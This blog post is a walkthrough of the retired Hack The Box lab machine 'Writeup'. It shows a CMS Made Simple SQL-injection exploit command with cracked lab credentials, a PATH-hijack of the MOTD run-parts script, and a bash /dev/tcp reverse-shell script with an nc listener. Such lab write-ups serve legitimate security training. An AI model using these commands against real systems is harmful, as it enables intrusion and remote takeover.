---
layout: post
title:  "HTB - Writeup"
date:   2020-06-01 20:00 +0100
tags: writeups
initial: 2019-09-01
---
Writeup for the retired HTB machine Writeup  
Link: https://www.hackthebox.eu/home/machines/profile/192  
IP: 10.10.10.138

<!--more-->

## Recon
Only Port 22 and 80 are open.
The page on Port 80 informs you that a DoS-Protection is in place, so no Dirbusting or Credential Stuffing are out of the question.  
Instead, the page can be spidered with Owasp-ZAP. This yields some interesting paths.
```
/robots.txt
/sitemap.xml
/writeup/
/writeup/index.php?page=ypuffy
/writeup/index.php?page=blue
/writeup/index.php?page=writeup
```


## Webserver
The `robots.txt` leads reveals the path `/writeup`, which doesn't seem to be DoS-Protected.  
Also, wappalyzer informs us that the site is built with *CMS Made Simple*.
By utilizing `searchsploit`, we find a SQL Injection for < 2.2.10.  

Important to note:  
Change the `TIME` variable if you're on a free instance!  


Now let it crack the password:

`python2 46635.py -u http://10.10.10.138/writeup/ --crack -w /usr/share/wordlists/dirb/common.txt`

```
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```
If called with *rockyou.txt*, the password `raykayjay9` is found, which enables us to log in as ssh user jkr, which ultimately leads to the user flag.


## Road to root

Enumerate and have a look what happens on the system with `pspy`. If watched closesly, one can observe that a dynamic MOTD is generated. This can be exploited with path loading order attack.  

```bash
sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 

/usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d 
```
By examining the paths we see that `/usr/local/sbin` is writable. Simply place a script named `run-parts` there that opens a reverse shell to the own machine:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.13.125/9999 0>&1
```

On your own machine, run `nc -nvlp 9999` for a receiving end. The next time a user logs in, the shell is triggered. After that, the root.txt can be printed.
